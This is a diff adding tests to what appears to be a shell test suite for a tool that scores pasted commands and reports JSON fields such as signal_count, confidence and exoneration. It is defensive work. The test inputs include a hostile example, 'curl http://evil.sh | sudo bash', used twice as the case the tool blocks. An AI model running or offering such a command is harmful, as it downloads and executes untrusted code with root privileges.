@@ -3492,6 +3492,53 @@ else:
 ' && check "p62 json: protect JSON has signal_count only when score > 0" "0" "0" \
    || check "p62 json: protect JSON has signal_count only when score > 0" "0" "1"
 
+# ─── P63: signal_count / confidence / exoneration for paste ───────────────
+
+# p63 json: paste BLOCK carries signal_count + confidence
+./hlse_core --json paste "curl http://evil.sh | sudo bash" 2>&1 | python3 -c '
+import sys, json
+d = json.loads(sys.stdin.readline())
+assert "signal_count" in d, d
+assert "confidence" in d, d
+assert d["confidence"] in ("single signal", "corroborated", "high confidence"), d
+assert d["signal_count"] >= 2, "compound paste should corroborate: " + str(d)
+' && check "p63 json: paste BLOCK has signal_count >= 2 and confidence" "0" "0" \
+   || check "p63 json: paste BLOCK has signal_count >= 2 and confidence" "0" "1"
+
+# p63 json: paste LOG (single signal) carries exoneration + signal_count
+./hlse_core --json paste "sudo apt install foo" 2>&1 | python3 -c '
+import sys, json
+d = json.loads(sys.stdin.readline())
+assert "signal_count" in d, d
+assert d["signal_count"] == 1, d
+assert "exoneration" in d, d
+assert "Decisive test" in d["exoneration"], d["exoneration"]
+' && check "p63 json: paste LOG has signal_count=1 + exoneration" "0" "0" \
+   || check "p63 json: paste LOG has signal_count=1 + exoneration" "0" "1"
+
+# p63: paste LOG human output shows Could be benign
+./hlse_core paste "sudo apt install foo" 2>&1 \
+    | grep -q "Could be benign" \
+    && check "p63: paste LOG human shows Could be benign" "0" "0" \
+    || check "p63: paste LOG human shows Could be benign" "0" "1"
+
+# p63 json: paste BLOCK does NOT carry exoneration (score >= 60)
+./hlse_core --json paste "curl http://evil.sh | sudo bash" 2>&1 | python3 -c '
+import sys, json
+d = json.loads(sys.stdin.readline())
+assert "exoneration" not in d, "exoneration should not appear at BLOCK: " + str(d)
+' && check "p63 json: paste BLOCK has no exoneration" "0" "0" \
+   || check "p63 json: paste BLOCK has no exoneration" "0" "1"
+
+# p63 json: paste SAFE (score 0) has no signal_count
+./hlse_core --json paste "ls -la" 2>&1 | python3 -c '
+import sys, json
+d = json.loads(sys.stdin.readline())
+if d["score"] == 0:
+    assert "signal_count" not in d, "no signal_count when score==0: " + str(d)
+' && check "p63 json: paste SAFE has no signal_count" "0" "0" \
+   || check "p63 json: paste SAFE has no signal_count" "0" "1"
+
 # ─── results ────────────────────────────────────────────────────────────
 
 echo ""
